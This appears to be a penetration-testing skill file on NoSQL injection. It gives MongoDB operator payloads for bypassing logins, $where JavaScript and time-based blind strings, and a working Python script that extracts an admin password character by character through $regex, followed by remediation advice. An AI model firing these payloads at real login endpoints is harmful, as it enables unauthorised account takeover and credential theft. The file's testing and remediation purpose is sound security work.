---
name: nosql-injection
description: NoSQL injection testing covering MongoDB operator injection, JavaScript injection, authentication bypass, and blind data extraction
---

# NoSQL Injection

NoSQL databases (MongoDB, CouchDB, Redis, Cassandra) expose injection surfaces through query operators, JavaScript execution contexts, and aggregation pipelines. Unlike SQL, NoSQL injection often uses JSON operator manipulation rather than string concatenation — every deserialized JSON field is a potential injection vector.

## Attack Surface

**Databases**
- MongoDB: operator injection (`$ne`, `$gt`, `$regex`, `$where`)
- CouchDB: JavaScript map reduce, Mango queries
- Redis: command injection through Lua scripting
- Firebase/Firestore: query filter manipulation
- Elasticsearch: query DSL injection

**Input Locations**
- JSON body fields where values become query filters
- URL query parameters with bracket notation (`username[$ne]=`)
- Cookie/header values deserialized into query objects
- GraphQL variables passed directly to DB queries
- ORM/ODM (`mongoose`, `mongoengine`) raw query surfaces

## Detection Payloads

### Operator Injection (MongoDB)

```json
{"username": {"$ne": ""}}
{"username": {"$ne": null}}
{"username": {"$gt": ""}}
{"username": {"$regex": ".*"}}
{"username": {"$exists": true}}
```

URL-encoded bracket notation:
```
username[$ne]=
username[$gt]=
username[$regex]=.*
username[$nin][]=wrongvalue
```

### Syntax Injection (Boolean Logic)

```
test' && '1'=='1
test' || '1'=='1
' || 1==1 || '
' || true || '
test'||1||'
```

### JavaScript Injection (`$where` operator)

```javascript
// Time-based blind
"this.username == 'admin' && sleep(5000) == sleep(5000)"

// Boolean condition
"this.username == 'admin'"

// Function call
"function(){return true}"
```

## Authentication Bypass

### MongoDB `$ne` / `$regex` Bypass

```json
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}
```

### URL Parameter Bypass

```
POST /login
username[$ne]=x&password[$ne]=x
username[$exists]=true&password[$ne]=x
```

## Blind Data Extraction

### Boolean-Based (character-by-character)

```json
{"username": "admin", "password": {"$regex": "^a.*"}}
{"username": "admin", "password": {"$regex": "^ab.*"}}
{"username": "admin", "password": {"$regex": "^abc.*"}}
```

Automate with Python:
```python
import requests

chars = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*'
found = ''
while True:
    hit = False
    for c in chars:
        r = requests.post(url, json={
            'username': 'admin',
            'password': {'$regex': f'^{found}{c}.*'}
        })
        if r.status_code == 200 and 'success' in r.text:
            found += c
            hit = True
            break
    if not hit:
        break
print(f'Password: {found}')
```

### Time-Based Blind

```json
{"username": "admin", "password": {"$where": "sleep(5000)"}}
```

## Operator Reference

| Operator | Description | Injection Use |
|----------|-------------|---------------|
| `$ne` | Not equals | Auth bypass: password != "" |
| `$gt` | Greater than | Auth bypass: password > "" |
| `$gte` | Greater than or equal | Field enumeration |
| `$lt` | Less than | Condition inversion |
| `$in` | In array | Username enumeration |
| `$nin` | Not in array | Exclusion bypass |
| `$regex` | Regex match | Blind character extraction |
| `$exists` | Field exists | Schema discovery |
| `$where` | JavaScript eval | RCE when server trusts |
| `$expr` | Aggregation expr | Complex condition injection |

## Key Vulnerabilities

### Operator Injection via JSON Body

Occurs when user input is directly merged into a MongoDB query object:
```javascript
// Vulnerable: direct object merge
const user = await User.findOne({ username: req.body.username, password: req.body.password });

// Attacker sends: {"username": "admin", "password": {"$ne": ""}}
// Query becomes: db.users.findOne({username:"admin", password:{$ne:""}})
// Returns admin user without knowing password
```

**Detection**: Send `{"field": {"$ne": null}}` — 200 OK = vulnerable

### JavaScript Injection via `$where`

```json
{"$where": "this.secret == 'test'"}
{"$where": "function(){ return sleep(5000); }"}
```

**Only works if**: `$where` operator is not disabled and server executes JS queries

### Aggregation Pipeline Injection

```json
[{"$match": {"user": "admin"}}, {"$project": {"_id": 0, "password": 1}}]
```

## Validation Approach

1. Confirm injection with `$ne: null` — behavior change indicates vulnerable query
2. Use boolean regex loop to extract one character at a time
3. Confirm same data via alternative endpoint (e.g., profile page) for cross-check
4. Blind time-based: use `$where` with `sleep()` OR measure `$regex` complexity timing difference
5. Report requires: original request, injected payload, response showing data extraction or bypass

## Tools

- `nosqlmap` — automated NoSQL injection testing
- `nosqli` — MongoDB injection scanner
- `mongol` — MongoDB audit tool
- Manual Python scripts for blind extraction (see above)
- Burp Suite with Param Miner to discover bracket-notation parameters

## Remediation

- Validate all input types — reject objects where strings are expected
- Use parameterized ODM queries (`Model.find({username: String(input)})`)
- Disable `$where` operator in MongoDB (`--noscripting` or `security.javascriptEnabled: false`)
- Sanitize with libraries like `mongo-sanitize` that strip `$` keys
- Whitelist allowed operators per query type
